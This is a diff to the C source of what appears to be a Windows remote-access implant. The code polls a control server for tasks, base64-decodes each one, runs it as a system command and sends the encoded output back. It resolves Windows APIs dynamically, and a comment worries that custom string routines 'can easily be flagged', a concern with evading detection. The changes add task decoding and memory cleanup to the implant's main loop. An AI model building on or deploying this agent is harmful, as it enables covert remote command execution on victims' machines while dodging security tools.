@@ -1,5 +1,4 @@
 // TODO: Using custom implementations of functionalities such as trimming and parsing is not okay as they can easily be flagged
-// TODO: Close the web handles
 
 #include "addresshunter.h"
 #include <winnt.h>
@@ -952,7 +951,9 @@ void myMain()
     CHAR* jsonResponse = NULL;
     CHAR* taskId = { 0 };
     CHAR* agentUuid = { 0 };
+    CHAR* b64Task;
     CHAR* task = NULL;
+    DWORD taskSize;
     CHAR* taskOutput;
     CHAR* b64EncodedOutput;
     DWORD b64EncodedOutputSize;
@@ -977,13 +978,36 @@ void myMain()
             continue;
         }
 
-        task = readJsonTask(api, jsonResponse, &taskId, &agentUuid);
+        b64Task = readJsonTask(api, jsonResponse, &taskId, &agentUuid);
 
-        if (task == NULL)
+        if (b64Task == NULL)
         {
             ((SLEEP)api->Sleep)(3000);
             continue;
         }
+
+        ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
+        (
+                (LPCSTR)b64Task,
+                myStrlenA(b64Task),
+                CRYPT_STRING_BASE64,
+                NULL,
+                &taskSize,
+                NULL,
+                NULL
+        );
+        task = (CHAR*)((CALLOC)api->calloc)(taskSize, sizeof(CHAR));
+
+        ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
+        (
+                (LPCSTR)b64Task,
+                myStrlenA(b64Task),
+                CRYPT_STRING_BASE64,
+                (PBYTE)task,
+                &taskSize,
+                NULL,
+                NULL
+        );
 
         taskOutput = myTrimB(api, ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput), '\n');
 
@@ -1011,9 +1035,17 @@ void myMain()
         {
             ((FREE)api->free)(b64EncodedOutput);
         }
+        if (jsonResponse)
+        {
+            ((FREE)api->free)(jsonResponse);
+        }
         if (json)
         {
             ((FREE)api->free)(json);
+        }
+        if (task)
+        {
+            ((FREE)api->free)(task);
         }
 
         ((SLEEP)api->Sleep)(3000);
